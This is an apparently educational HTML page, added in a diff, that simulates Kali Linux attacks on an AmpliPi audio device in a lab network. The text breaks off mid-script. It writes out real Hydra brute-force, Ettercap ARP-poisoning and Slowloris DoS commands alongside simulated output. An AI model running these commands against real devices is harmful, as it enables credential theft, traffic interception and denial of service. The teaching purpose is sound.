@@ -1,0 +1,1279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GenCyber - Security Testing on AmpliPi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* Kali Linux Terminal Background */
+        .kali-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(135deg, #0d1117 0%, #161b22 50%, #0d1117 100%),
+                radial-gradient(circle at 20% 50%, rgba(33, 186, 69, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 50%, rgba(139, 148, 158, 0.05) 0%, transparent 50%);
+            z-index: 1;
+        }
+
+        /* Matrix-style background */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.05;
+            z-index: 2;
+        }
+
+        .matrix-column {
+            position: absolute;
+            top: -100%;
+            font-family: monospace;
+            font-size: 16px;
+            color: #21ba45;
+            animation: matrixFall linear infinite;
+        }
+
+        @keyframes matrixFall {
+            to {
+                transform: translateY(calc(100vh + 100%));
+            }
+        }
+
+        /* Content Wrapper */
+        .content-wrapper {
+            position: relative;
+            z-index: 10;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeInDown 1s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .kali-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #21ba45, #1a8b33);
+            padding: 10px 30px;
+            border-radius: 30px;
+            font-size: 0.9em;
+            font-weight: 600;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 20px rgba(33, 186, 69, 0.3);
+        }
+
+        .main-title {
+            font-size: clamp(2.5em, 5vw, 4em);
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #21ba45, #58a6ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: #8b949e;
+            font-size: 1.3em;
+            font-weight: 300;
+        }
+
+        /* Attack Dashboard */
+        .attack-dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .attack-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 15px;
+            padding: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .attack-card:hover {
+            border-color: #21ba45;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(33, 186, 69, 0.2);
+        }
+
+        .attack-card.active {
+            border-color: #21ba45;
+            background: #1c2128;
+            box-shadow: 0 0 30px rgba(33, 186, 69, 0.3);
+        }
+
+        .attack-icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+
+        .attack-title {
+            color: #58a6ff;
+            font-size: 1.3em;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .attack-desc {
+            color: #8b949e;
+            font-size: 0.95em;
+            line-height: 1.5;
+        }
+
+        .attack-status {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #6e7681;
+        }
+
+        .attack-status.ready {
+            background: #ffa502;
+            animation: pulse 2s infinite;
+        }
+
+        .attack-status.active {
+            background: #21ba45;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 currentColor; }
+            50% { opacity: 0.8; box-shadow: 0 0 0 8px transparent; }
+        }
+
+        /* Terminal Container */
+        .terminal-container {
+            background: #0d1117;
+            border: 2px solid #30363d;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .terminal-header {
+            background: #161b22;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot-red { background: #f85149; }
+        .dot-yellow { background: #ffa502; }
+        .dot-green { background: #21ba45; }
+
+        .terminal-title {
+            flex: 1;
+            text-align: center;
+            font-family: monospace;
+            color: #8b949e;
+            font-size: 0.9em;
+        }
+
+        .terminal {
+            background: #0d1117;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+            color: #c9d1d9;
+            height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .terminal-line {
+            margin: 5px 0;
+            animation: typeLine 0.1s ease-out;
+        }
+
+        @keyframes typeLine {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .terminal-prompt {
+            color: #21ba45;
+            font-weight: bold;
+        }
+
+        .terminal-command {
+            color: #58a6ff;
+        }
+
+        .terminal-output {
+            color: #8b949e;
+        }
+
+        .terminal-success {
+            color: #21ba45;
+            font-weight: bold;
+        }
+
+        .terminal-error {
+            color: #f85149;
+        }
+
+        .terminal-warning {
+            color: #ffa502;
+        }
+
+        /* Network Visualization */
+        .network-viz-container {
+            background: #161b22;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            position: relative;
+            min-height: 400px;
+        }
+
+        .network-device {
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: #0d1117;
+            border: 2px solid #30363d;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .network-device:hover {
+            transform: scale(1.1);
+            border-color: #58a6ff;
+            box-shadow: 0 5px 20px rgba(88, 166, 255, 0.3);
+        }
+
+        .network-device.attacker {
+            border-color: #f85149;
+        }
+
+        .network-device.target {
+            border-color: #21ba45;
+        }
+
+        .device-icon {
+            font-size: 2.5em;
+            margin-bottom: 5px;
+        }
+
+        .device-label {
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+
+        .device-ip {
+            font-size: 0.8em;
+            color: #8b949e;
+            font-family: monospace;
+        }
+
+        /* Connection Lines */
+        .connection-line {
+            position: absolute;
+            height: 2px;
+            background: #30363d;
+            transform-origin: left center;
+            z-index: 5;
+        }
+
+        .connection-line.active {
+            background: #21ba45;
+            animation: dataFlow 2s linear infinite;
+        }
+
+        @keyframes dataFlow {
+            0% { background: linear-gradient(90deg, transparent, #21ba45, transparent); }
+            100% { background: linear-gradient(90deg, transparent, #21ba45, transparent); }
+        }
+
+        /* Data Packets */
+        .data-packet {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #21ba45;
+            border-radius: 50%;
+            box-shadow: 0 0 10px currentColor;
+            pointer-events: none;
+            z-index: 15;
+        }
+
+        .data-packet.attack {
+            background: #f85149;
+        }
+
+        /* Attack Details Panel */
+        .attack-details {
+            background: #161b22;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            display: none;
+        }
+
+        .attack-details.active {
+            display: block;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .details-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .details-title {
+            font-size: 1.5em;
+            color: #58a6ff;
+            font-weight: 600;
+        }
+
+        .close-button {
+            background: none;
+            border: 1px solid #30363d;
+            color: #8b949e;
+            padding: 5px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .close-button:hover {
+            border-color: #f85149;
+            color: #f85149;
+        }
+
+        /* Code Block */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+        }
+
+        .code-comment {
+            color: #6e7681;
+        }
+
+        .code-keyword {
+            color: #ff7b72;
+        }
+
+        .code-string {
+            color: #a5d6ff;
+        }
+
+        .code-variable {
+            color: #79c0ff;
+        }
+
+        /* Control Panel */
+        .control-panel {
+            background: #161b22;
+            border-radius: 15px;
+            padding: 20px;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+        }
+
+        .control-button {
+            background: #21863a;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .control-button:hover {
+            background: #2ea043;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(33, 186, 69, 0.3);
+        }
+
+        .control-button.danger {
+            background: #da3633;
+        }
+
+        .control-button.danger:hover {
+            background: #f85149;
+        }
+
+        .control-button:disabled {
+            background: #30363d;
+            color: #6e7681;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Results Panel */
+        .results-panel {
+            background: #0d1117;
+            border: 2px solid #30363d;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .result-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 10px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .result-item:last-child {
+            border-bottom: none;
+        }
+
+        .result-icon {
+            font-size: 1.5em;
+        }
+
+        .result-text {
+            flex: 1;
+        }
+
+        .result-value {
+            font-family: monospace;
+            color: #21ba45;
+            font-weight: bold;
+        }
+
+        /* AmpliPi Device Image */
+        .amplipro-showcase {
+            text-align: center;
+            margin: 30px 0;
+            position: relative;
+        }
+
+        .amplipro-image {
+            max-width: 100%;
+            width: 800px;
+            height: auto;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 2px solid #30363d;
+        }
+
+        .image-caption {
+            margin-top: 15px;
+            color: #8b949e;
+            font-style: italic;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .attack-dashboard {
+                grid-template-columns: 1fr;
+            }
+            
+            .control-panel {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .control-button {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .network-viz-container {
+                min-height: 500px;
+            }
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #30363d;
+            border-radius: 50%;
+            border-top-color: #21ba45;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Wireshark View */
+        .wireshark-view {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 0.85em;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        .packet-line {
+            display: flex;
+            gap: 15px;
+            padding: 5px 0;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .packet-line:hover {
+            background: #161b22;
+        }
+
+        .packet-no {
+            color: #8b949e;
+            width: 50px;
+        }
+
+        .packet-time {
+            color: #8b949e;
+            width: 80px;
+        }
+
+        .packet-src {
+            color: #58a6ff;
+            width: 120px;
+        }
+
+        .packet-dst {
+            color: #21ba45;
+            width: 120px;
+        }
+
+        .packet-protocol {
+            color: #ffa502;
+            width: 60px;
+        }
+
+        .packet-info {
+            color: #c9d1d9;
+            flex: 1;
+        }
+
+        /* Success/Fail Indicators */
+        .status-indicator {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 5em;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .status-indicator.success {
+            color: #21ba45;
+            animation: statusPop 1s ease-out;
+        }
+
+        .status-indicator.fail {
+            color: #f85149;
+            animation: statusPop 1s ease-out;
+        }
+
+        @keyframes statusPop {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0);
+            }
+            50% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1.2);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Kali Background -->
+    <div class="kali-bg"></div>
+    
+    <!-- Matrix Rain Effect -->
+    <div class="matrix-rain" id="matrixRain"></div>
+
+    <!-- Main Content -->
+    <div class="content-wrapper">
+        <!-- Header -->
+        <header class="header">
+            <div class="kali-badge">🐉 KALI LINUX TESTING</div>
+            <h1 class="main-title">Security Experiments on AmpliPi</h1>
+            <p class="subtitle">Real-World Vulnerability Testing & Analysis</p>
+        </header>
+
+        <!-- Attack Selection Dashboard -->
+        <div class="attack-dashboard">
+            <!-- Hydra Attack Card -->
+            <div class="attack-card" onclick="selectAttack('hydra')" id="hydraCard">
+                <div class="attack-status ready"></div>
+                <div class="attack-icon">🔑</div>
+                <h3 class="attack-title">Dictionary Password Attack</h3>
+                <p class="attack-desc">Using Hydra to crack weak passwords with rockyou.txt wordlist</p>
+            </div>
+
+            <!-- ARP Poisoning Card -->
+            <div class="attack-card" onclick="selectAttack('arp')" id="arpCard">
+                <div class="attack-status ready"></div>
+                <div class="attack-icon">🎭</div>
+                <h3 class="attack-title">ARP Cache Poisoning</h3>
+                <p class="attack-desc">Man-in-the-Middle attack using Ettercap & Wireshark</p>
+            </div>
+
+            <!-- Slowloris Card -->
+            <div class="attack-card" onclick="selectAttack('slowloris')" id="slowlorisCard">
+                <div class="attack-status ready"></div>
+                <div class="attack-icon">🌊</div>
+                <h3 class="attack-title">Slowloris DoS Attack</h3>
+                <p class="attack-desc">Denial-of-Service attack exhausting web server resources</p>
+            </div>
+        </div>
+
+        <!-- Network Visualization -->
+        <div class="network-viz-container" id="networkViz">
+            <!-- Router -->
+            <div class="network-device" style="left: 50%; top: 20%; transform: translateX(-50%);">
+                <div class="device-icon">📡</div>
+                <div class="device-label">Router</div>
+                <div class="device-ip">192.168.1.1</div>
+            </div>
+
+            <!-- AmpliPi -->
+            <div class="network-device target" style="left: 20%; top: 60%;" id="amplipiDevice">
+                <div class="device-icon">🎵</div>
+                <div class="device-label">AmpliPi</div>
+                <div class="device-ip">192.168.1.101</div>
+            </div>
+
+            <!-- iPhone -->
+            <div class="network-device" style="right: 20%; top: 60%;" id="iphoneDevice">
+                <div class="device-icon">📱</div>
+                <div class="device-label">iPhone</div>
+                <div class="device-ip">192.168.1.105</div>
+            </div>
+
+            <!-- Kali Linux -->
+            <div class="network-device attacker" style="left: 50%; bottom: 20%; transform: translateX(-50%);" id="kaliDevice">
+                <div class="device-icon">🐉</div>
+                <div class="device-label">Kali Linux</div>
+                <div class="device-ip">192.168.1.110</div>
+            </div>
+        </div>
+
+        <!-- Terminal Container -->
+        <div class="terminal-container">
+            <div class="terminal-header">
+                <div class="terminal-dot dot-red"></div>
+                <div class="terminal-dot dot-yellow"></div>
+                <div class="terminal-dot dot-green"></div>
+                <div class="terminal-title">root@kali:~# AmpliPi Security Testing</div>
+            </div>
+            <div class="terminal" id="mainTerminal">
+                <div class="terminal-line"><span class="terminal-prompt">root@kali:~#</span> <span class="terminal-command">Ready for security testing...</span></div>
+            </div>
+        </div>
+
+        <!-- Control Panel -->
+        <div class="control-panel">
+            <button class="control-button" onclick="runSelectedAttack()" id="runButton">
+                ▶️ Run Attack
+            </button>
+            <button class="control-button danger" onclick="stopAttack()" id="stopButton" disabled>
+                ⏹️ Stop Attack
+            </button>
+            <button class="control-button" onclick="clearTerminal()">
+                🗑️ Clear Terminal
+            </button>
+            <button class="control-button" onclick="showNetworkScan()">
+                🔍 Network Scan
+            </button>
+        </div>
+
+        <!-- Attack Details Panels -->
+        <!-- Hydra Details -->
+        <div class="attack-details" id="hydraDetails">
+            <div class="details-header">
+                <h2 class="details-title">🔑 Dictionary Password Attack Details</h2>
+                <button class="close-button" onclick="closeDetails()">✕</button>
+            </div>
+            
+            <div class="code-block">
+                <span class="code-comment"># Hydra command for AmpliPi password attack</span><br>
+                <span class="code-keyword">hydra</span> <span class="code-variable">-l admin -P /usr/share/wordlists/rockyou.txt</span> <span class="code-string">192.168.1.101</span> <span class="code-keyword">http-post-form</span> \<br>
+                <span class="code-string">"/auth/login?next_url=/:username=admin&password=^PASS^:R=302"</span>
+            </div>
+
+            <div class="results-panel">
+                <h3 style="color: #58a6ff; margin-bottom: 15px;">Discovered Vulnerabilities:</h3>
+                <div class="result-item">
+                    <div class="result-icon">❌</div>
+                    <div class="result-text">No HTTPS encryption</div>
+                </div>
+                <div class="result-item">
+                    <div class="result-icon">❌</div>
+                    <div class="result-text">No password complexity requirements</div>
+                </div>
+                <div class="result-item">
+                    <div class="result-icon">❌</div>
+                    <div class="result-text">No account lockout mechanism</div>
+                </div>
+                <div class="result-item">
+                    <div class="result-icon">✅</div>
+                    <div class="result-text">Password found: <span class="result-value">abc123</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ARP Poisoning Details -->
+        <div class="attack-details" id="arpDetails">
+            <div class="details-header">
+                <h2 class="details-title">🎭 ARP Cache Poisoning Details</h2>
+                <button class="close-button" onclick="closeDetails()">✕</button>
+            </div>
+            
+            <div class="code-block">
+                <span class="code-comment"># Ettercap command for MITM attack</span><br>
+                <span class="code-keyword">ettercap</span> <span class="code-variable">-T -M arp:remote</span> <span class="code-string">/192.168.1.101//</span> <span class="code-string">/192.168.1.105//</span>
+            </div>
+
+            <div class="wireshark-view" id="wiresharkView">
+                <div class="packet-line">
+                    <span class="packet-no">1</span>
+                    <span class="packet-time">0.000000</span>
+                    <span class="packet-src">192.168.1.105</span>
+                    <span class="packet-dst">192.168.1.101</span>
+                    <span class="packet-protocol">ARP</span>
+                    <span class="packet-info">Who has 192.168.1.101? Tell 192.168.1.105</span>
+                </div>
+                <div class="packet-line">
+                    <span class="packet-no">2</span>
+                    <span class="packet-time">0.000142</span>
+                    <span class="packet-src">192.168.1.110</span>
+                    <span class="packet-dst">192.168.1.105</span>
+                    <span class="packet-protocol">ARP</span>
+                    <span class="packet-info">192.168.1.101 is at 00:11:22:33:44:55 (Spoofed)</span>
+                </div>
+                <div class="packet-line">
+                    <span class="packet-no">3</span>
+                    <span class="packet-time">0.001523</span>
+                    <span class="packet-src">192.168.1.105</span>
+                    <span class="packet-dst">192.168.1.101</span>
+                    <span class="packet-protocol">HTTP</span>
+                    <span class="packet-info">POST /api/streams/play (Intercepted)</span>
+                </div>
+                <div class="packet-line">
+                    <span class="packet-no">4</span>
+                    <span class="packet-time">0.002147</span>
+                    <span class="packet-src">192.168.1.105</span>
+                    <span class="packet-dst">192.168.1.101</span>
+                    <span class="packet-protocol">AirPlay</span>
+                    <span class="packet-info">Metadata: Artist - "The Beatles", Track - "Hey Jude"</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slowloris Details -->
+        <div class="attack-details" id="slowlorisDetails">
+            <div class="details-header">
+                <h2 class="details-title">🌊 Slowloris DoS Attack Details</h2>
+                <button class="close-button" onclick="closeDetails()">✕</button>
+            </div>
+            
+            <div class="code-block">
+                <span class="code-comment"># Slowloris command targeting AmpliPi web server</span><br>
+                <span class="code-keyword">python3</span> <span class="code-variable">slowloris.py</span> <span class="code-variable">-p 80 -s 10000</span> <span class="code-string">192.168.1.101</span>
+            </div>
+
+            <div class="results-panel">
+                <h3 style="color: #58a6ff; margin-bottom: 15px;">Attack Impact:</h3>
+                <div class="result-item">
+                    <div class="result-icon">🔴</div>
+                    <div class="result-text">Web interface: <span class="result-value">Unresponsive</span></div>
+                </div>
+                <div class="result-item">
+                    <div class="result-icon">🟢</div>
+                    <div class="result-text">AirPlay streaming: <span class="result-value">Still working</span></div>
+                </div>
+                <div class="result-item">
+                    <div class="result-icon">📊</div>
+                    <div class="result-text">Open connections: <span class="result-value">10,000+</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- AmpliPi Device Showcase -->
+        <div class="amplipro-showcase">
+            <h2 style="color: #58a6ff; margin-bottom: 20px;">AmpliPi System Under Test</h2>
+            <img src="data:image/svg+xml,%3Csvg width='800' height='400' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='800' height='400' fill='%231c2128' rx='15'/%3E%3Crect x='50' y='50' width='700' height='300' fill='%232a2a3e' rx='10'/%3E%3Ctext x='400' y='120' font-family='Arial' font-size='32' fill='%2358a6ff' text-anchor='middle'%3EAmpliPi Pro Audio System%3C/text%3E%3Cg%3E%3Crect x='100' y='160' width='150' height='150' fill='%23161b22' rx='8'/%3E%3Ctext x='175' y='240' font-family='Arial' font-size='48' fill='%2321ba45' text-anchor='middle'%3E🎵%3C/text%3E%3C/g%3E%3Cg%3E%3Crect x='300' y='160' width='150' height='150' fill='%23161b22' rx='8'/%3E%3Ctext x='375' y='240' font-family='Arial' font-size='48' fill='%2358a6ff' text-anchor='middle'%3E📡%3C/text%3E%3C/g%3E%3Cg%3E%3Crect x='500' y='160' width='150' height='150' fill='%23161b22' rx='8'/%3E%3Ctext x='575' y='240' font-family='Arial' font-size='48' fill='%23f85149' text-anchor='middle'%3E🔓%3C/text%3E%3C/g%3E%3Ctext x='175' y='290' font-family='Arial' font-size='14' fill='%238b949e' text-anchor='middle'%3E6 Zones%3C/text%3E%3Ctext x='375' y='290' font-family='Arial' font-size='14' fill='%238b949e' text-anchor='middle'%3ERaspberry Pi%3C/text%3E%3Ctext x='575' y='290' font-family='Arial' font-size='14' fill='%238b949e' text-anchor='middle'%3EPort 80 HTTP%3C/text%3E%3C/svg%3E" 
+                 alt="AmpliPi System" class="amplipro-image">
+            <p class="image-caption">Target: AmpliPro Home Audio System - IP: 192.168.1.101</p>
+        </div>
+    </div>
+
+    <!-- Status Indicators -->
+    <div class="status-indicator" id="statusIndicator"></div>
+
+    <script>
+        let selectedAttack = null;
+        let attackRunning = false;
+        let terminalLines = [];
+
+        // Initialize Matrix Rain
+        function initMatrixRain() {
+            const matrixRain = document.getElementById('matrixRain');
+            const columns = Math.floor(window.innerWidth / 20);
+            
+            for (let i = 0; i < columns; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = i * 20 + 'px';
+                column.style.animationDuration = (Math.random() * 10 + 5) + 's';
+                column.style.animationDelay = Math.random() * 5 + 's';
+                
+                // Generate random characters
+                let chars = '';
+                for (let j = 0; j < 30; j++) {
+                    chars += Math.random() > 0.5 ? '1' : '0';
+                    if (j < 29) chars += '<br>';
+                }
+                column.innerHTML = chars;
+                
+                matrixRain.appendChild(column);
+            }
+        }
+
+        // Terminal functions
+        function addTerminalLine(text, type = 'output') {
+            const terminal = document.getElementById('mainTerminal');
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            
+            let content = '';
+            switch(type) {
+                case 'command':
+                    content = `<span class="terminal-prompt">root@kali:~#</span> <span class="terminal-command">${text}</span>`;
+                    break;
+                case 'success':
+                    content = `<span class="terminal-success">${text}</span>`;
+                    break;
+                case 'error':
+                    content = `<span class="terminal-error">${text}</span>`;
+                    break;
+                case 'warning':
+                    content = `<span class="terminal-warning">${text}</span>`;
+                    break;
+                default:
+                    content = `<span class="terminal-output">${text}</span>`;
+            }
+            
+            line.innerHTML = content;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function clearTerminal() {
+            const terminal = document.getElementById('mainTerminal');
+            terminal.innerHTML = '<div class="terminal-line"><span class="terminal-prompt">root@kali:~#</span> <span class="terminal-command">clear</span></div>';
+            addTerminalLine('Terminal cleared. Ready for new commands...', 'output');
+        }
+
+        // Attack selection
+        function selectAttack(attack) {
+            // Update selected attack
+            selectedAttack = attack;
+            
+            // Update UI
+            document.querySelectorAll('.attack-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            document.getElementById(attack + 'Card').classList.add('active');
+            
+            // Update attack status
+            document.querySelectorAll('.attack-status').forEach(status => {
+                status.classList.remove('active');
+                status.classList.add('ready');
+            });
+            
+            // Show attack details
+            closeDetails();
+            addTerminalLine(`Selected attack: ${attack.toUpperCase()}`, 'warning');
+        }
+
+        // Run selected attack
+        function runSelectedAttack() {
+            if (!selectedAttack) {
+                addTerminalLine('Error: No attack selected!', 'error');
+                return;
+            }
+            
+            if (attackRunning) {
+                addTerminalLine('Error: Attack already in progress!', 'error');
+                return;
+            }
+            
+            attackRunning = true;
+            document.getElementById('runButton').disabled = true;
+            document.getElementById('stopButton').disabled = false;
+            
+            // Update attack status
+            const statusEl = document.querySelector(`#${selectedAttack}Card .attack-status`);
+            statusEl.classList.remove('ready');
+            statusEl.classList.add('active');
+            
+            switch(selectedAttack) {
+                case 'hydra':
+                    runHydraAttack();
+                    break;
+                case 'arp':
+                    runArpAttack();
+                    break;
+                case 'slowloris':
+                    runSlowlorisAttack();
+                    break;
+            }
+        }
+
+        // Hydra Attack Simulation
+        function runHydraAttack() {
+            addTerminalLine('hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.101 http-post-form "/auth/login?next_url=/:username=admin&password=^PASS^:R=302"', 'command');
+            
+            setTimeout(() => {
+                addTerminalLine('Hydra v9.1 (c) 2021 by van Hauser/THC & David Maciejak', 'output');
+                addTerminalLine('[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries', 'output');
+            }, 500);
+            
+            let attempts = 0;
+            const passwords = ['123456', 'password', 'admin', 'letmein', 'welcome', 'abc123'];
+            
+            const attackInterval = setInterval(() => {
+                if (!attackRunning) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                attempts += Math.floor(Math.random() * 100) + 50;
+                addTerminalLine(`[ATTEMPT] Trying password ${attempts}/14344399...`, 'output');
+                
+                if (attempts > 300) {
+                    clearInterval(attackInterval);
+                    addTerminalLine('[80][http-post-form] host: 192.168.1.101   login: admin   password: abc123', 'success');
+                    addTerminalLine('1 of 1 target successfully completed, 1 valid password found', 'success');
+                    showSuccess();
+                    document.getElementById('hydraDetails').classList.add('active');
+                    completeAttack();
+                }
+            }, 1000);
+        }
+
+        // ARP Attack Simulation
+        function runArpAttack() {
+            addTerminalLine('ettercap -T -M arp:remote /192.168.1.101// /192.168.1.105//', 'command');
+            
+            setTimeout(() => {
+                addTerminalLine('Ettercap 0.8.3.1 copyright 2001-2020', 'output');
+                addTerminalLine('Listening on wlan0...', 'output');
+            }, 500);
+            
+            setTimeout(() => {
+                addTerminalLine('Starting Unified sniffing...', 'output');
+                addTerminalLine('ARP poisoning victims:', 'warning');
+                addTerminalLine(' GROUP 1 : 192.168.1.101 00:11:22:33:44:55', 'output');
+                addTerminalLine(' GROUP 2 : 192.168.1.105 AA:BB:CC:DD:EE:FF', 'output');
+            }, 1500);
+            
+            // Animate network connections
+            animateNetworkAttack();
+            
+            setTimeout(() => {
+                addTerminalLine('Captured HTTP POST to /api/streams/play', 'success');
+                addTerminalLine('Captured AirPlay metadata: Artist - "The Beatles", Track - "Hey Jude"', 'success');
+                document.getElementById('arpDetails').classList.add('active');
+                showSuccess();
+                completeAttack();
+            }, 4000);
+        }
+
+        // Slowloris Attack Simulation
+        function runSlowlorisAttack() {
+            addTerminalLine('python3 slowloris.py -p 80 -s 10000 192.168.1.101', 'command');
+            
+            setTimeout(() => {
+                addTerminalLine('[*] Attacking 192.168.1.101 on port 80 with 10000 sockets', 'warning');
+                addTerminalLine('[*] Creating sockets...', 'output');
+            }, 500);
+            
+            let sockets = 0;
+            const attackInterval = setInterval(() => {
+                if (!attackRunning) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                sockets += Math.floor(Math.random() * 500) + 300;
+                if (sockets > 10000) sockets = 10000;
+                
+                addTerminalLine(`[+] Sending keep-alive headers... Socket count: ${sockets}`, 'output');
+                
+                if (sockets >= 10000) {
+                    clearInterval(attackInterval);
+                    addTerminalLine('[!] Target web server is no longer responding!', 'error');
+                    addTerminalLine('[✓] DoS attack successful - Web interface down', 'success');
+                    addTerminalLine('[i] Note: AirPlay streaming on port 7000 still functional', 'warning');
+                    document.getElementById('slowlorisDetails').classList.add('active');
+                    showSuccess();
+                    completeAttack();
+                }
+            }, 800);
+        }
+
+        // Network animation
+        function animateNetworkAttack() {
+            const kali = document.getElementById('kaliDevice');
+            const amplipro = document.getElementById('amplipiDevice');
+            const iphone = document.getElementById('iphoneDevice');
+            
+            // Create connection lines
+            createAttackLine(kali, amplipro);
+            createAttackLine(kali, iphone);
+            
+            // Animate data packets
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    createDataPacket(iphone, amplipro, true);
+                }, i * 1000);
+            }
+        }
+
+        function createAttackLine(from, to) {
+            const line = document.createElement('div');
+            line.className = 'connection-line active';
+            
+            const fromRect = from.getBoundingClientRect();
+            const toRect = to.getBoundingClientRect();
+            const containerRect = from.parentElement.getBoundingClientRect();
+            
+            const x1 = fromRect.left + fromRect.width / 2 - containerRect.left;
+            const y1 = fromRect.top + fromRect.height / 2 - containerRect.top;
+            const x2 = toRect.left + toRect.width / 2 - containerRect.left;
+            const y2 = toRect.top + toRect.height / 2 - containerRect.top;
+            
